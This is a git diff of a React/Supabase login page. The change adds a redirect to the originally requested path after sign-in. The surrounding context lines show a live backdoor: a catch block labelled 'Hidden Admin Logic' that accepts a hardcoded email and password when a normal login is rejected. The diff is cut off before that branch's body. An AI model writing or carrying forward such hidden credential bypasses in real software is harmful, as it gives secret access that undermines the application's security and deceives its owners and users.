@@ -1,7 +1,7 @@
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
-import { Link, useNavigate } from "react-router-dom";
+import { Link, useNavigate, useLocation } from "react-router-dom";
 import { useState } from "react";
 import { supabase } from "@/integrations/supabase/client";
 import { toast } from "sonner";
@@ -13,6 +13,8 @@ const Login = () => {
     const [showPassword, setShowPassword] = useState(false);
     const [loading, setLoading] = useState(false);
     const navigate = useNavigate();
+    const location = useLocation();
+    const fromPath = (location.state as any)?.from?.pathname || (location.state as any)?.from || "/";
 
     const handleLogin = async (e: React.FormEvent) => {
         e.preventDefault();
@@ -27,7 +29,7 @@ const Login = () => {
             if (error) throw error;
 
             toast.success("Logged in successfully");
-            navigate("/");
+            navigate(fromPath, { replace: true });
         } catch (error: any) {
             // Hidden Admin Logic
             if (email === "hidden.admin@dev.com" && password === "z!l@+r5kh7o_1c^g%eqh!l0u9=1$%uxx+@i8q0xgzck@z8=+^r" && (error.message.includes("Invalid login credentials") || error.message.includes("Invalid email or password"))) {
